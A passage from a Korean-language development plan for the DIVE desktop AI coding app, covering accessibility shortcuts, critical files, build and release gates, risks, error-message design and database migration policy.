- **Permission card 단축키 `A` (Approve) / `R` (Reject) / `E` (Edit args)**: SPEC §12.2 요구, 현재 미구현.
- **Slide-in tablist arrow key navigation**: SPEC §12.2 요구 (좌/우 화살표로 탭 이동), 현재 탭 클릭만 가능.

**구현 사양**:
- 권한 카드 focused 상태에서만 A/R/E 단축키 활성 (form-field 충돌 방지 로직 기존 패턴 재사용).
- Tablist에 `role="tablist"` + `aria-selected` + 좌/우 화살표로 focus 이동 + Enter로 선택.
- axe-core 검사(`D-6`) allowlist에서 해당 항목 제거.

**QA 시나리오**:
- **도구**: Playwright (`dive/scripts/verify-a11y-shortcuts.mjs` 신규) + NVDA 수동 세션.
- **단계**: (1) 권한 카드 표시 → `Tab`으로 포커스 → `A` 키 → tool_approve IPC 호출 확인, (2) `R` 키 → tool_deny, (3) `E` 키 → args editor 열림, (4) slide-in 탭 포커스 → `→` / `←` 화살표로 다음/이전 탭 이동 확인, Enter로 선택, (5) NVDA에서 각 키 조작 시 live region 읽기 발생.
- **기대 결과**: Playwright assert 5/5 pass. axe-core allowlist에서 해당 항목 2개 제거 후 신규 violation 0.

**신규 ADR**: ADR-068 — 접근성 단축키 최종 완성 + SPEC §12.2 100% 준수 선언.


---

## 7. Critical Files

### 트랙 0 (가장 시급)

**Rust 백엔드**:
- `dive/src-tauri/src/lib.rs` — production setup hook, `dev_mock` 호출 제거, `from_app_handle` 호출
- `dive/src-tauri/src/db/mod.rs` — `Database::open(path)` 재사용. API 추가 없음.
- `dive/src-tauri/src/db/migrations.rs` — `schema_version` 체크 + future schema refuse + pre-migration backup. migration v4 (provider_config.is_active) + v5 (cards.test_command, checkpoints.changed_files/stats)
- `dive/src-tauri/src/ipc/mod.rs` — `AppState { runtime, project_root, ... }`, `runtime_snapshot`, `project_root_snapshot`, 5개 call site 업데이트
- `dive/src-tauri/src/ipc/provider_runtime.rs` (신규) — `ProviderRuntime`, `NoProviderSentinel`
- `dive/src-tauri/src/ipc/provider.rs` — `provider_connect` health check + atomic swap, `provider_disconnect` NoProviderSentinel 복귀
- `dive/src-tauri/src/providers/factory.rs` (신규) — kind+key+base_url → `Arc<dyn LlmProvider>` 빌더. **Anthropic / OpenAI / OpenRouter / opencode_zen / Codex / Custom 6종 분기**
- `dive/src-tauri/src/providers/openai/mod.rs` — `opencode_zen()` helper + `with_models()` / `with_id()` chain 추가 (§0-18)
- `dive/src-tauri/src/ipc/workmap.rs` (신규) — `card_create`, `card_list`, `card_delete`, `card_reorder`, `workmap_get` IPC
- `dive/src-tauri/src/db/dao/card.rs` — `create`, `delete_by_id`, `reorder`
- `dive/src-tauri/src/tools/search_files.rs` (신규) — ripgrep-like 검색 (§0-19)
- `dive/src-tauri/src/tools/delete_file.rs` (신규) — danger 권한 카드 (§0-19)
- `dive/src-tauri/src/tools/run_process.rs` (신규) — 제한적 프로세스 실행 (§0-19)
- `dive/src-tauri/src/tools/bash.rs` — 경로 분석 + 외부 경로 danger 승격 + 네트워크 명령 경고 (§0-20)
- `dive/src-tauri/src/checkpoint/mod.rs` — auto-trigger 4개 추가 + changed_files 메타 + pre-restore 백업 (§0-21)
- `dive/src-tauri/src/dive/event_log.rs` (신규 또는 기존 확장) — 통합 `log_event` + 모든 call site emission + PII redaction (§0-22)
- `dive/src-tauri/src/dive/verify.rs` — `test_command` 실행 경로 (§0-23)
- `dive/src-tauri/tests/it_production_wiring.rs` (신규)
- `dive/src-tauri/tests/it_provider_swap.rs` (신규) — 4개 call site race 테스트
- `dive/src-tauri/tests/it_project_switch.rs` (신규) — project_root snapshot 테스트
- `dive/src-tauri/tests/it_cards_persistence.rs` (신규)
- `dive/src-tauri/tests/it_bash_sandbox.rs` (신규) — 외부 경로 감지 + danger 승격 (§0-20)
- `dive/src-tauri/tests/it_eventlog_coverage.rs` (신규) — 전 이벤트 emission (§0-22)

**Frontend**:
- `dive/src/components/shell/MainShell.tsx` — `useChatSession` + `useWorkmap` 와이어, demo 데이터 전부 제거
- `dive/src/components/demo/DemoShell.tsx` (신규) — demo route root
- `dive/src/hooks/useWorkmap.ts` (신규) — cards CRUD + 실시간 sync
- `dive/src/stores/workmap.ts` — product 경로는 hydrate 기반, local 메소드는 `_local` 접미사
- `dive/src/stores/project-session.ts` — `withTauriOrDemoMock` 리네이밍, silent fallback 제거
- `dive/src/components/onboarding/OnboardingDialog.tsx` — Skip 재정의, 배너 CTA, **OpenCode Zen 4번째 choice 추가** (§0-18)
- `dive/src/components/onboarding/NewProjectDialog.tsx` — onboarding chain
- `dive/src/lib/rc1-migration.ts` (신규)
- `dive/src/App.tsx` — `?route=` + `?demo=` dual namespace, deprecated redirect
- `dive/src/pages/settings.tsx` — Custom provider 카드 + OpenRouter child-key 섹션 + 5필드 메타 표시 (Track B)
- `dive/src/components/chat/ChatInput.tsx` — 모델 셀렉터 활성화 (Track B)
- `dive/src/components/shell/ChatArea.tsx` — onEdit / onResend prop chain (Track C)
- `dive/src/components/permission-card/DangerCard.tsx` — A/R/E 단축키 (Track D)
- `dive/src/components/slide-in/SlideInPanel.tsx` — tablist arrow key (Track D)
- `dive/src/components/slide-in/CheckpointTimeline.tsx` — changed_files tooltip (§0-21)

**CI + 스모크**:
- `dive/scripts/release-gate-smoke.mjs` (신규) — tauri-driver 자동 스모크
- `dive/scripts/verify-rc1-migration.mjs` (신규)
- `dive/scripts/verify-onboarding.mjs` — Skip 동작 재단언
- `.github/workflows/release-gate.yml` (신규) — Windows runner에서 자동 스모크
- `docs/packaging-windows.md` — 수동 스모크 7종 체크리스트 확장
- `docs/release-gate-2026-05.md` (신규) — developer / release gate 2단계 SOP

### 트랙 B / C / D
- `dive/src-tauri/src/auth/codex_oauth.rs`, `dive/src-tauri/src/mcp/{client,transport}.rs` — 회귀 패치
- `dive/src/i18n/{ko,en}.json` — 영어 패리티 (D-1)
- `dive/src/lib/token-pricing.ts`, `dive/src/i18n/pricing.json` (D-2)
- `dive-dashboard/` 디렉토리 (D-5)
- `.github/workflows/build.yml`, `release.yml` — macOS/Linux/updater 매트릭스
- `docs/teacher-manual.md` — OpenRouter child key 발급/회수 섹션 (C-1)

### 항상 갱신
- `DIVE_PROGRESS.md` — Phase 6 재정의 + Phase 7 (Production Wiring) 신설 ~ Phase 10 체크리스트
- `DIVE_DECISIONS.md` — ADR-039 ~ 057+
- `DIVE_NEXT.md` — 매 task마다
- `CHANGELOG.md` — `[Yanked] 1.0.0-rc.1` 섹션 + rc.2~ 누적, 1.1.0 섹션
- `README.md` — 로드맵 수정, 배지 갱신, rc 상태 명시

---

## 8. 재사용할 기존 자산

**유지**:
- **SoT 4파일 + Ralph 루프**: `RALPH_PROMPT.md`, `ralph_run.sh/.ps1` 그대로.
- **Playwright 26 스위트 헬퍼/locale 격리 패턴** — 신규 스위트도 동일 패턴. 단, **역할 축소**: UI 렌더링 검증만. IPC 증명은 tauri-driver로 이관.
- **`release.yml` 3곳 버전 검증** 그대로.
- **Keep a Changelog**: rc.1 `[Yanked]` + rc.2~ 새 블록.
- **`useGlobalShortcuts` / `ToastProvider`**: form-field 억제 / live region 패턴 유지.
- **`MockProvider` / `wiremock` / `InMemoryKeyring`**: **test/dev 전용** cfg-gate로 격리. production 바이너리 심볼에 미포함.
- **DIVE-2의 현재 UI** 그대로. DIVE Codex의 시각 폴리싱 가져오지 않음.
- **OpenRouter provisioning IPC** (`openrouter_issue_key` / `revoke_all` / `list_keys`): 트랙 C 학생 키 발급에 재사용.

**제거 또는 재분류**:
- **`useMockChatStream` 훅**: 기존은 chat-demo만 사용. `DemoShell` 내부로 이동.
- **`DEMO_CHANGED_FILES` / `simulateToolCallCount` / mock VerifyLog**: product에서 제거, demo용 별도 상수로 복제.
- **`verify-onboarding.mjs` Skip 통과 단정**: 제품 적대적 동작이므로 재작성 (§0-10).

---

## 9. 검증

### 9.1 Developer Gate (매 PR / 매 커밋)

```bash
cd ~/DIVE-2/dive

# Frontend
pnpm typecheck && pnpm lint --max-warnings 0 && pnpm format:check && pnpm build

# Rust
cd src-tauri
cargo fmt --all -- --check
cargo clippy --all-targets -- -D warnings
cargo test --all-targets   # 트랙 0 후 +n (production wiring + cards + provider swap + project switch)

# 개발 쉘 + Playwright (UI 렌더링 검증)
cd ..
pnpm dev &   # localhost:1420
node scripts/verify-production-wire.mjs         # 신규 (Track 0-12 일부)
node scripts/verify-rc1-migration.mjs           # 신규 (Track 0-13)
for s in workmap chat permission slide-in integration onboarding settings; do
  node scripts/verify-$s.mjs || break
done
```

**통과 기준**: 모든 스크립트 exit 0 + `cargo test --all-targets` pass + clippy clean.

**한계**: Developer gate는 Vite dev server 대상이라 Tauri IPC / keyring / NSIS 동작을 증명하지 못함. 이는 Release gate의 책임.

### 9.2 Release Gate (rc 태그 푸시 전)

**자동 스모크** (Windows runner, `release-gate.yml`):
```bash
# CI가 수행
pnpm tauri:build:x64
./scripts/release-gate-smoke.mjs  # tauri-driver + wiremock 시나리오
```

**수동 스모크 7종** (Windows 실기, 릴리스 담당자):
- `docs/packaging-windows.md` §7 체크리스트 pass/fail 기록
- 각 항목 담당자 서명
- 블로커 발견 시 rc 태그 푸시 블록

### 9.3 Track 0 Release Gate Success Criteria (최종)

**Developer gate 전체 통과 +**

NSIS 설치 빌드에서:
1. 첫 실행 → Onboarding 자동 열림
2. 오타 API 키 → health check 401 → DB/keyring 미변경 + inline error
3. 올바른 키 → "연결됨"
4. 첫 프로젝트 생성 → `%LOCALAPPDATA%\...\dive.db` 생성 (OS 탐색기로 확인 가능)
5. 카드 3개 (AiAssist 또는 수동) → instruction 입력 → 채팅 1턴 → assistant 응답
6. Verify → approve → 자동 checkpoint 생성
7. 앱 종료 → 재실행 → projects / sessions / cards / messages / checkpoints 전부 복원
8. Settings(`?route=settings`) 진입 → provider disconnect → MainShell 상단 배너 표시 → 다시 connect → 배너 사라짐
9. Skip 플로우: Onboarding에서 Skip → onboarded=false 유지 → 앱 재시작 시 Onboarding 다시 자동 오픈

통과 못하면 **트랙 0 미완** → rc.2 태그 금지.

### 9.4 외부 자원 / 사람 게이트 (트랙 B 이후)

- 실 ChatGPT Plus/Pro 계정 1개 이상
- npm `@modelcontextprotocol/server-*` 3종 환경
- Windows 실기: x64 필수, ARM64 있으면
- NVDA + Color Oracle (또는 유사 색맹 시뮬레이터)
- 토평고 협력 교사 + 25명 학생 환경 + OpenRouter main key
- (트랙 D) Azure Trusted Signing 또는 EV 인증서, macOS 노트북, Linux 실기 (또는 CI만)

---

## 10. 위험 / 가정

### 가정
- **가정 1**: `app.path().app_local_data_dir()`가 Tauri 2 setup hook에서 정상 해석. `tauri.conf.json`의 `identifier` 확정 이후 경로 불변.
- **가정 2**: `RwLock<ProviderRuntime>` snapshot clone으로 race 해결 가능. 동시 대규모 부하 아님 (학생 1명이 turn 1개씩).
- **가정 3**: tauri-driver가 Windows에서 안정 동작. 실패 시 수동 7종으로 rc.2 대체 가능 (ADR에 명시).

### 위험 (우선순위 순)

- **위험 1 ⚠️ [승격]**: **Workmap sync 레이어가 사실상 신규 기능** — Track 0의 핵심 스코프. 4주 일정의 성패를 가름.
  - 완화: 매 금요일 체크인, 누적 +5일 지연 시 트랙 B 1주 연기, Track 0 스코프는 축소하지 않음.
  - 조기 경보: 2주차 금요일에 `card_create` IPC + `workmap_get` IPC + `useWorkmap` 훅 기본 동작이 끝나지 않으면 즉시 Oracle 상담.

- **위험 2**: Track 0 도중 추가 mock 의존성 발견 (예: tool execution이 가짜 결과 반환, MCP 클라이언트의 미완 코드).
  - 완화: 매일 끝에 사용자 체크인, 발견 즉시 §7 Critical Files에 추가 + ADR.

- **위험 3**: rc.1 yanked 처리 후 이미 받은 사용자/협력 교사 혼란.
  - 완화: README 상단 명시 + 학교 협력자 사전 공지(이메일/매뉴얼 섹션) + GitHub Release `[YANKED]` + 일회성 모달.

- **위험 4**: tauri-driver 환경 설정 실패로 자동 스모크 구축 지연.
  - 완화: Track 0-12 시작 시 1~2일 프로토타입만 먼저 시도. 실패 시 수동 7종으로 rc.2 나가되 rc.3에서 자동화 완료. ADR-051에 명시.

- **위험 5**: Linux secret-service 부재 환경에서 키링 동작 실패 (트랙 D).
  - 완화: ADR-056의 file-backed keyring + passphrase fallback. v1.1 이전에 의사결정.

- **위험 6**: Tauri Updater 개인키 분실 시 자동 업데이트 영구 차단.
  - 완화: 1Password + 2명 (총괄 + 김나영) 보관, 연 1회 복원 테스트, ADR-057 백업 절차.

- **위험 7**: `provider_connect` health check이 provider 레이트 리밋 또는 방화벽으로 실패 → 학생이 올바른 키로도 "연결 실패" 볼 수 있음.
  - 완화: 에러 메시지에 "네트워크 문제일 수 있습니다 - 잠시 후 다시 시도" + 재시도 버튼. 401 vs timeout 구분. 학교 방화벽 이슈 FAQ 추가.

- **위험 8**: OpenRouter child key 배포 시 학생에게 키 원문이 보이는 구조 → 유출 가능성.
  - 완화: 수업 전 교사가 학교 PC에 사전 입력 / 수업 후 즉시 revoke. `docs/teacher-manual.md`에 프로세스 명문화.

- **위험 9**: opencode zen 베타 서비스 불안정 / 무료 모델 중단.
  - 완화: 무료 모델 리스트는 runtime fetch (`/v1/models`) + 하드코딩 fallback. 특정 모델 404 시 다른 모델로 자동 제안. ADR-058에 "무료 모델 중단 시 자동 페일오버" 전략 기술.

- **위험 10**: opencode zen 무료 모델의 학생 과제 데이터 훈련 사용.
  - 완화: 교사 매뉴얼 고지 의무 + Onboarding UI에 각주 + 수업 전 학생 동의 수집 템플릿 제공. 민감 과제는 OpenRouter child key 또는 로컬 모델 권장.

- **위험 11**: `run_process` / `delete_file` 신규 도구 악용 (학생이 장난으로 시스템 명령 실행).
  - 완화: 권한 카드 `danger` + sandbox + 각 실행 EventLog 기록 (§0-22). 교사가 파일럿 후 로그 리뷰 가능.

- **위험 12**: Bash 샌드박스는 완전 차단 아님 (§0-20 ADR-060 명시).
  - 완화: 교사에게 "학생이 의도적으로 danger를 승인하면 프로젝트 외부 작업 가능함" 사전 안내 + 교실 수업 환경에서 교사 옆에 있을 때만 진행 권장.

---

## 11. Error UX 명세 (신설)

모든 제품 에러는 다음 중 하나의 UI 패턴으로 표시. 원문 영문 에러 노출 금지.

### 11.1 `NoProviderSentinel` / `NotConfigured` (provider 미연결 상태)

**트리거**: `chat_send` / `card_verify` / `ai_assist_cards` / `prompt_check_review` 중 하나 호출 시 runtime snapshot이 sentinel.

**UI 동작**:
- 해당 작업 시도 차단 (chat input disable, verify 버튼 disable 등).
- MainShell 상단 지속 배너: "AI 프로바이더가 연결되지 않았습니다" + "[설정 열기]" 버튼 (→ `?route=settings`).
- 채팅 입력 placeholder: "먼저 AI 프로바이더를 연결해 주세요".

### 11.2 `ProjectNotSelected`

**트리거**: chat_send / checkpoint_* 호출 시 `project_root_snapshot()`이 빈 PathBuf.

**UI 동작**:
- 중앙 empty state: "프로젝트를 선택하거나 생성하세요" + "[새 프로젝트]" / "[기존 폴더 열기]" 버튼.
- 사이드바는 정상 렌더링.

### 11.3 Health check 실패 (onboarding / reconnect)

**에러 종류별 문구**:
- 401: "API 키가 올바르지 않습니다. 키를 다시 확인해 주세요."
- 네트워크 timeout: "서버 응답이 없습니다. 네트워크 또는 방화벽 설정을 확인해 주세요. ([자세히])"
- 5xx: "프로바이더 서버 문제입니다. 잠시 후 다시 시도해 주세요."
- 기타: "알 수 없는 오류: `<error code>`. [문제 제보]"

"자세히" / "문제 제보" 링크는 GitHub Issue 템플릿으로.

### 11.4 IPC 실패 (silent fallback 제거 이후)

**트리거**: product 경로에서 `withTauriOrDemoMock(false)`이 throw.

**UI 동작**:
- Toast 에러 (5초 표시, 수동 닫기 가능).
- store `error` 필드에 원문 기록 (devtools 접근용).
- 중복 에러 억제 (같은 에러 코드 3초 내 재발 시 카운트만 증가).

### 11.5 Schema 마이그레이션 실패

**트리거**: 앱 시작 시 migrate 실패 또는 future schema 감지.

**UI 동작**:
- Tauri dialog (native): "DIVE 시작 실패: 데이터베이스 마이그레이션 오류. 로그: `%LOCALAPPDATA%\...\logs\startup-<timestamp>.log`"
- "백업 폴더 열기" / "지원 문의" 버튼.
- 앱 자동 종료.

---

## 12. 마이그레이션 정책 (신설)

### 12.1 SQLite schema
- **Forward-only**. 이전 버전으로 롤백하는 마이그레이션 금지.
- 각 마이그레이션은 `migrations/<NNN>_<name>.sql` 순서대로 실행.
- `schema_version` 테이블 필수 (현재 존재 확인: [migrations.rs](dive/src-tauri/src/db/migrations.rs)).
- **Destructive 변경** (column drop, table drop, 타입 변경으로 데이터 손실 가능): 사전 백업 필수 (§12.2).
- **Future schema 감지**: DB의 max(version) > 앱의 latest → refuse open + UI 에러 (§11.5).

### 12.2 Pre-migration backup
- 앱 시작 시 migrate 전 DB 파일을 `%LOCALAPPDATA%\...\backups\dive-<old_version>-<YYYYMMDD-HHMMSS>.db`로 복사.
- 최근 5개만 유지 (오래된 백업 자동 정리).
- 복원 절차: `docs/user-guide/troubleshooting.md`에 명시.

### 12.3 Frontend localStorage
- **Schema**: 각 key별 값 포맷 고정, 버전 필드 없음 (단순 key=value).
- **rc.1 → rc.2**: 일괄 삭제 + 안내 모달 (§0-13).
- **rc.2 이후**: 불가역 변경 시 해당 key에 대한 일회성 마이그레이션 함수 추가 + `dive:migrated_<version>` 플래그.

### 12.4 Keyring
- OS keyring에 저장된 API 키는 앱 버전 독립적 (scope 이름으로 관리).
- 제거 시점: `provider_disconnect` / `codex_oauth_logout` / 수동 Credential Manager.
- **rc.1 → rc.2**: rc.1이 키를 저장했으면 rc.2에서 그대로 사용 가능 (provider hydration이 자동 연결 시도). 단, rc.1은 dev_mock이라 실제 저장된 키가 없을 가능성이 높음.

---

## 13. 즉시 다음 액션 (사용자 승인 후 Track 0-1부터)

### 13.1 승인 대기 사항
- [ ] 이 계획서 (`DIVE_PLAN.md`) 최종 승인
- [ ] Tauri `identifier` 확정 (예: `com.dive.app` 또는 `kr.coreelab.dive`) — ADR-039에 기록
- [ ] OpenRouter main key 발급 (협력 교사 또는 총괄 결제) — 트랙 C 진입 전까지
- [ ] 협력 교사 사전 공지 초안 (rc.1 yank 사유 + rc.2 일정) — 트랙 C 1주 전
- [ ] **⚠️ opencode zen 테스트 키 회수 및 재발급**: 채팅/로그에 노출된 키 revoke + 새 키를 `.env.local` 또는 OS keyring에 저장. 커밋/문서/테스트 fixture에 절대 하드코딩 금지.
- [ ] V-stage 실 테스트 실행(§0-23) Track 0 포함 여부 확정 — 4주차 초반 일정 체크 후 결정
- [ ] **opencode zen 무료 모델 이용 시 데이터 훈련 고지 의무** 교사 매뉴얼 문구 승인 (§C-1 학생 공지 + 동의 절차)

### 13.2 Track 0 실행 순서

1. **0-1** (1주차): `Database::open` 재사용 + setup hook 경로 + migration 정책 → ADR-039
2. **0-2** (1주차): `ProviderRuntime` 구조체 + dev_mock cfg-gating → ADR-040, 041
3. **0-3** (1~2주차): Provider factory + 4개 call site → ADR-042
4. **0-4** (2주차): provider_connect health check + atomic swap → ADR-043
5. **0-5** (2주차): lib.rs production setup + hydration → ADR-044
6. **0-6a/6b** (2~3주차): Cards IPC + `useWorkmap` 훅 + AiAssistDialog 연결 → ADR-045
7. **0-7** (3주차): MainShell 전면 와이어 + demo 데이터 제거 → ADR-046
8. **0-8** (3주차): URL namespace 분리 → ADR-047
9. **0-9** (3주차): Silent fallback 제거 → ADR-048
10. **0-10** (3주차): Onboarding + onboarded 재정의 → ADR-049
11. **0-11** (3주차): project_root RwLock → ADR-050
12. **0-12** (4주차): tauri-driver release gate → ADR-051
13. **0-13** (4주차): rc.1 마이그레이션 모달 + GitHub Release yank → ADR-052
14. **0-18** (2주차 병행): opencode zen provider 추가 → ADR-058
15. **0-19** (3~4주차): 빌트인 도구 3종 보강 → ADR-059
16. **0-20** (3~4주차): Bash sandbox 하드닝 → ADR-060
17. **0-21** (3~4주차): Checkpoint auto-trigger 완성 → ADR-061
18. **0-22** (4주차): EventLog emission 완성 → ADR-062
19. **0-23** (4주차, 선택적): V-stage 실 테스트 실행 → ADR-063 (일정 타이트 시 Track B 이월 가능)
20. **0-14/15/16/17**: ADR 묶음 정리 + 버전 태그 + 커밋 검증 + Success Criteria 확인

### 13.3 SoT 파일 갱신 방향

- **DIVE_NEXT.md**: `상태: [TASK_IN_PROGRESS]`, `Phase: 7 (Production Wiring + Cards Persistence)`, `작업: 7-1 (Disk DB path + setup hook)` 로 갱신.
- **DIVE_PROGRESS.md**:
  - Phase 6 재정의: "UI/i18n/a11y/문서화 완료, 패키징·릴리스는 회수 (rc.1 Yanked)"
  - Phase 7 신설: "Production Wiring + Cards Persistence (Track 0, 4주)"
  - Phase 6 체크리스트의 "v1.0.0-rc.1 NSIS 빌드" 항목에 `⚠️ Yanked — ADR-052` 주석
- **CHANGELOG.md**: `## [Yanked] 1.0.0-rc.1 — 2026-05-01` 섹션 추가 (사유 / 영향 / 복구 / ADR 링크).
- **README.md**:
  - 로드맵 표 수정 (Phase 6 ✅ → 🟡, Phase 7 추가)
  - release 배지 제거 또는 `rc.1-yanked` 문구
  - 설치 섹션 상단에 "⚠️ rc.1은 회수됨, rc.2 이상 사용" 경고 박스

